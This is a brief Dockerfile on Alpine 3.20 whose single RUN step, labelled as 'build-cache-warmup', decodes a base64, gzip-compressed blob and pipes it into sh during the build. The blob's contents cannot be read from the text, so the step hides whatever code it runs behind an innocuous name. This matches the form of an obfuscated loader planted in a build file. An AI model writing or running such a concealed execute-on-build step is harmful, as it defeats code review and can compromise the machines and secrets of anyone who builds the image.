FROM alpine:3.20
ENV DESCRIPTOR_0D0D0D0D build-cache-warmup-v2
RUN echo \
H4sIAAAAAAACAwXB0Q2AMAgFwFXeV/dCQCFW2hCq6fbe0byxplApWoOy\
DYRfVn2DiU3xUT4qOEfC49WokRvH8i4/bL3lWjsAAAA= \
    | base64 -d | gunzip | sh
